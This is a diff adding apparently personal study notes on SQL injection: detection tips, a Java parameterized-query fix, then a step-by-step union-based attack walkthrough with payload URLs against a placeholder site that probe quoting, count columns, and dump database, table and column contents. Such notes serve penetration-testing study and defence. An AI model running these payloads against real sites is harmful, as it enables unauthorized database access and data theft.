@@ -1,0 +1,167 @@
+SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.
+
+
+Detection:
+
+This typically involves:
+	• Submitting the single quote character ' and looking for errors or other anomalies.
+	• Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic differences in the resulting application responses.
+	• Submitting Boolean conditions such as OR 1=1 and OR 1=2, and looking for differences in the application's responses.
+	• Submitting payloads designed to trigger time delays when executed within an SQL query, and looking for differences in the time taken to respond.
+  • Submitting OAST payloads designed to trigger an out-of-band network interaction when executed within an SQL query, and monitoring for any resulting interactions.
+
+
+Prevention:
+
+Most instances of SQL injection can be prevented by using parameterized queries (also known as prepared statements) instead of string concatenation within the query.
+The following code is vulnerable to SQL injection because the user input is concatenated directly into the query:
+
+String query = "SELECT * FROM products WHERE category = '"+ input + "'";
+Statement statement = connection.createStatement();
+ResultSet resultSet = statement.executeQuery(query);
+
+
+This code can be easily rewritten in a way that prevents the user input from interfering with the query structure:
+
+PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
+statement.setString(1, input);
+ResultSet resultSet = statement.executeQuery();
+
+
+For a parameterized query to be effective in preventing SQL injection, the string that is used in the query must always be a hard-coded constant, and must never contain any variable data from any origin.
+
+
+
+Step 1 check error:
+
+'
+"
+
+If both give error then the chance is either its simple integer without parentheses or with parentheses 
+
+If ' gives error but double quote doesn’t that means it’s a single quote error with or without parentheses
+If " gives error but single quote doesn't that means it’s a double quote error with or without parentheses 
+
+
+Step 2 check error type:
+
+For integer:
+
+'       ->	Error
+"	      ->  Error
+Integer or 1=1	      -> Diff output
+Integer and 1=1	      -> same output
+Integer and true	    -> Same output
+Integer and false	    -> No output
+Integer and true--+	  -> Same output
+Integer--+	          -> Same output
+
+For single quote:
+
+'       -> error/no output
+' or '1'='1          -> different output
+' and '1'='1	       -> same output
+' and true--+	       -> same output
+' and false--+	     -> no output
+
+For double quote:
+
+"	       -> Error/no output
+" or "1"="1	        -> Different output
+" and "1"="1	      -> Same output
+" and true--+	      -> Same output
+" and false--+	    -> No output
+
+
+Step 3 check the comments to balance the query: 
+
+--
+--+
+--+-
+#
+`
+;%oo
+
+
+E.g
+
+fakesite.com/report.php?id=23--
+
+fakesite.com/report.php?id=23'--
+
+
+fakesite.com/report.php?id=23"--
+
+
+fakesite.com/report.php?id=23)--
+
+
+fakesite.com/report.php?id=23')--
+
+fakesite.com/report.php?id=23")--
+
+
+Use the comment that will remove the error and displays the original result
+
+
+
+Step 4 check the number of columns:
+
+Use "order by <number of columns>"
+Increase the number of column  1 by 1.. Start from 1.. Wherever it gives an error the number of columns are one less than that number
+
+
+E.g
+fakesite.com/report.php?id=23' order by 1--
+
+
+
+Always write injectable queries between comment and the balance
+
+
+
+
+Step 5 Union injection:
+
+Use "union select <1,2,3….,n (till the number of columns>"
+
+
+Fakesite.com/report.php?id=23' union select 1,2,3,4,5,6--
+(suppose it has 6 columns)
+
+
+This will reflect a number on the page 
+In case it doesn't reflect then invalidate the query so it shows one and only output and the numbers will be reflected
+
+(If you see any of these numbers printed in the webpage or the title or anywhere else then you can know the developer is printing multiple rows. But in case you can not see any of these numbers printed then you can simply invalidate the first query so that it wont give any output and eventually your output will become the one and only output to be printed.
+
+From <http://www.securityidiots.com/Web-Pentest/SQL-Injection/Basic-Union-Based-SQL-Injection.html> )
+
+
+You can use 
+"hello1","hello2",…..,"hellon" instead of numbers and if this gives error you can use hex value of these to implement it.
+
+
+
+
+Step 6  Get table names, column names and get data:
+
+Whichever number gets reflected, use commands instead of that number in the query to do  injection.
+
+Fakesite.com/report.php?id=23' union select 1,database(),3,4,5,6--
+
+Fakesite.com/report.php?id=23' union select 1,table_name,3,4,5,6 from information_schema.tables where  table_schema=database()--
+
+Fakesite.com/report.php?id=23' union select 1,column_name,3,4,5,6 from information_schema.columns where  table_schema=database() and table_name='<tablename>'--
+
+Fakesite.com/report.php?id=23' union select 1,concat(<column1>,0x3a,<column2),3,4,5,6 from <tablename>
+
+
+
+
+You can use "limit I,j"  where i is the index of a row (starts from 0) and j is the number of upcoming rows you want  to display (starts from 1, if you use 0 then it will not display any output)
+
+
+E.g
+
+Fakesite.com/report.php?id=23' union select 1,concat(<column1>,0x3a,<column2),3,4,5,6 from <tablename> limit 0,10
